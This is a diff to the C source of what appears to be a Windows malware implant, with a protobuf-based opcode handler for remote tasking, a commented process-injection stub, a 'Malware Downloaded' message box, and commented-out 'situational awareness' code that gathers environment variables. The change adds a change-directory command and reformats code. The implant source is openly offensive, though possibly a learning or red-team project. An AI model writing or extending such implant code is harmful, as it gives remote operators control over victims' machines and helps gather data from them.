@@ -5,6 +5,7 @@
 #include "include/execute.h"
 #include "include/httpclient.h"
 #include "list_directory.h"
+#include "change_directory.h"
 //#include "http_client.h"
 #include <stdio.h>
 #include <string.h>
@@ -13,7 +14,7 @@
 #include <pb_decode.h>
 #include "implant.pb.h"
 #include "opcodes.h"
-
+#include "opcodes.h"
 #include <sodium.h>
 #include <iphlpapi.h>
 
@@ -370,8 +371,8 @@ BOOL StdlibOperation(TaskRequest *tr, char** data, size_t *dataSize)
 
     case 49:
         *data = listdirs(tr->Args);
-	*dataSize = strlen(*data);	
-	break;
+        *dataSize = strlen(*data);
+        break;
 
     case 2:
         //data = readfile(args);
@@ -389,14 +390,15 @@ BOOL StdlibOperation(TaskRequest *tr, char** data, size_t *dataSize)
         //data = makedirectory(args);
         break;
 
-    case 6:
+    case 50:
         //data = changedir(args);
+        *data = changedir(tr->Args);
+        *dataSize = strlen(*data);
         break;
 
     case 7:
         //data = whoami(args);
         break;
-
     default:
         break;
 	return false;
@@ -411,8 +413,26 @@ int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
 	bool Success = false;
 	printf("SUCCES = FALSE\n");
 
-	switch (tr->Opcode)
-        {
+        switch (tr->Opcode) {
+	
+        // case OPCODE_GETENV:
+        //     printf("Handling GETENV Opcode\n");
+        //     char* envData;
+        //     size_t dataSize;
+        //     getEnvironmentVariables(&envData, &dataSize);  // Assuming this function populates envData and dataSize
+
+        //     if (envData != NULL) {
+        //         pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(dataSize));
+        //         if (bytes_array != NULL) {
+        //             bytes_array->size = dataSize;
+        //             memcpy(bytes_array->bytes, envData, dataSize);
+        //             tResp->Response = bytes_array;
+        //             free(envData); // Assuming envData was dynamically allocated
+        //             Success = true;
+        //         }
+        //     }
+        //     break;
+        
         case OPCODE_NOTASK:
             // no task, just sleep an check in later
             Success = true;
@@ -427,7 +447,6 @@ int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
             // spawn a process and inject code into its main thread
             //Success = SpawnExecuteCode(Buffer);
             break;
-
         case OPCODE_STDLIB: ;
             // stdlib command so lets run it
 	    size_t outputSize = 0;
@@ -469,7 +488,7 @@ int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
 }
 
 int main() {
-    MessageBoxA(NULL,
+	MessageBoxA(NULL,
         (LPCSTR)L"Malware Downloaded",
         (LPCSTR)L"Account Details",
         MB_OK);
@@ -504,45 +523,43 @@ int main() {
 	return 0;
 }
 
-/**
+
 //SITUATIONAL AWARENESS
 
-// Function to gather and print environment variables
-
 //read environment variables
-void getEnvironmentVariables() {
-    // Pointer to hold the environment variables
-    LPTSTR lpEnvironment = GetEnvironmentStrings();
-    if (lpEnvironment == NULL) {
-        printf("Failed to retrieve environment variables\n");
-        return;
-    }
+// void getEnvironmentVariables() {
+//     // Pointer to hold the environment variables
+//     LPTSTR lpEnvironment = GetEnvironmentStrings();
+//     if (lpEnvironment == NULL) {
+//         printf("Failed to retrieve environment variables\n");
+//         return;
+//     }
 
-    // Iterate over each environment variable
-    LPTSTR lpszVariable = lpEnvironment;
-    while (*lpszVariable != TEXT('\0')) {
-        // Find the end of the variable name and the beginning of its value
-        LPTSTR lpszEqualSign = _tcschr(lpszVariable, TEXT('='));
-        if (lpszEqualSign != NULL) {
-            // Copy the variable name
-            TCHAR variable[MAX_PATH];
-            int length = lpszEqualSign - lpszVariable;
-            _tcsncpy_s(variable, MAX_PATH, lpszVariable, length);
-            variable[length] = TEXT('\0');
+//     // Iterate over each environment variable
+//     LPTSTR lpszVariable = lpEnvironment;
+//     while (*lpszVariable != TEXT('\0')) {
+//         // Find the end of the variable name and the beginning of its value
+//         LPTSTR lpszEqualSign = _tcschr(lpszVariable, TEXT('='));
+//         if (lpszEqualSign != NULL) {
+//             // Copy the variable name
+//             TCHAR variable[MAX_PATH];
+//             int length = lpszEqualSign - lpszVariable;
+//             _tcsncpy_s(variable, MAX_PATH, lpszVariable, length);
+//             variable[length] = TEXT('\0');
 
-            // Print the variable name and value
-            _tprintf(TEXT("%s: %s\n"), variable, lpszEqualSign + 1);
-        }
+//             // Print the variable name and value
+//             _tprintf(TEXT("%s: %s\n"), variable, lpszEqualSign + 1);
+//         }
 
-        // Move to the next environment variable
-        lpszVariable += lstrlen(lpszVariable) + 1;
-    }
+//         // Move to the next environment variable
+//         lpszVariable += lstrlen(lpszVariable) + 1;
+//     }
 
-    // Free the environment block
-    FreeEnvironmentStrings(lpEnvironment);
-}
+//     // Free the environment block
+//     FreeEnvironmentStrings(lpEnvironment);
+// }
 
-
+/**
 // Function to gather and print network interfaces
 void getNetworkInterfaces() {
     // Variable to store the result of the GetAdaptersAddresses function
